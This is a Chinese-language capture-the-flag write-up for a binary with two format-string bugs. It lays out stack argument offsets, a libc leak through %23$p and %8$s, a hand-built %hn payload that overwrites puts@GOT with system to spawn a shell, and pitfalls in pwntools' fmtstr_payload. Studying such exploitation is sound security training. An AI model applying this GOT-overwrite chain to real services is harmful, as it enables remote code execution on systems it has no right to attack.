## 漏洞：两次格式化字符串

```
char buf[0x80];                    // rbp-0x80
init();                            // setvbuf(stdin/out/err, NULL, _IONBF, 0)
puts("What's your name?");
read(0, buf, 0x18);                // (A) 名字, 24B, 不补 NUL
printf(buf);                       // (1) 格式化字符串 #1  <== "什么字符都可以作为名字"
puts("Good name!But do you know the magic of printf?");
puts("Tell me something you know about printf!");
read(0, buf+0x18, 0x40);           // (B) 64B
printf(buf+0x18);                  // (2) 格式化字符串 #2
puts(buf);                         // (3) 参数就是"名字"缓冲区  <== 关键的可用点
puts("Oh,obviously you don't know the magic!");
puts("Good bye");
```

题面"名字可以是任意字符" = 名字直接当 printf 的格式化串；
"留给你的信息…保留且永不逝去" = 进程内长期驻留的 libc 指针（栈上返回地址 / GOT）可以被泄漏出来。

## 栈上参数定位（实测）

`main` 的 `rsp = rbp-0x80`，`call printf` 压入返回地址后 printf 的栈上可变参数：

| 参数 | 位置 | 内容 |
|---|---|---|
| arg6 | `rbp-0x80` | `buf[0..7]`（= 名字开头） |
| arg7 | `rbp-0x78` | `buf[8..15]` |
| arg8 | `rbp-0x70` | `buf[16..23]` |
| arg9 | `rbp-0x68` | `buf+0x18` ← **第二次 printf 的格式化串起点, fmtstr offset = 9** |
| arg23 | `rbp+8` | `__libc_start_call_main+128` = **libc_base + 0x29d90**（实测 3 次一致） |

## 利用链（单连接、无爆破）

1. **名字（24B）** = `b"sh;#%23$p|%8$s\x00\x00" + p64(printf@got)`
   - 作格式化串：`%23$p` 泄漏栈上返回地址 → `libc_base = leak - 0x29d90`；
     `%8$s` 直接读 `printf@got` 里的真实地址（原始字节）→ 交叉校验基址。
   - 同时它本身是**合法 shell 命令**：`sh` 后面 `#...` 是注释（决定性的小技巧）。
2. **第二次输入（64B）** = 手写 fmtstr：把 `puts@got` 写成 `system`（offset 9）。
3. `puts(buf)` 于是变成 `system("sh;#%23$p|%8$s")` → 直接 `sh`，得到交互 shell。
4. shell 里 `cat /flag*` 等找 flag。

## 踩过的坑（重要，别再用 pwntools 那个 API）

- **`fmtstr_payload(9, {get:val}, write_size='short')` 会生成错误的 payload**：
  它有时选出 `%lln`(8B) + `%hhn`(1B) + `%n`(4B) 的原子组合，后一条 4 字节写会覆盖
  前一条写好的高位字节。实测 `system=0x790844a50d70` 时 `puts@got` 变成 `0x844a50d70` → SIGSEGV。
  用一个 C harness（`work/22_names/harness.c`）验证：6 个测试值里 2 个写错。
  最终脚本里的 `build_fmtstr()` 自己生成：只用 `%hn`，按块值升序发射保证打印计数单调，
  地址 8 字节对齐追加在末尾（其高位 0 字节顺便当格式串的 NUL 终止符，长度恒 ≤ 64）。
- **pwntools 的 `libc.address` 会残留**：重试时 `libc.symbols['printf']` 变成绝对地址，
  交叉校验会算出 `base + (base + off)` 的错值。改成模块级常量 `PRINTF_OFF / SYSTEM_OFF`。
- **`read(0, buf+0x18, 0x40)` 之后没有 NUL 终止符**：如果 payload 恰好 64 字节且末尾不是 0，
  printf 会越界解析未初始化栈内存。payload 末尾的 `p64(addr)` 自带 0 字节，正好解决。
- 本地跑必须 `cwd=附件目录`（`DT_NEEDED` 写死了 `./libc.so.6`）。
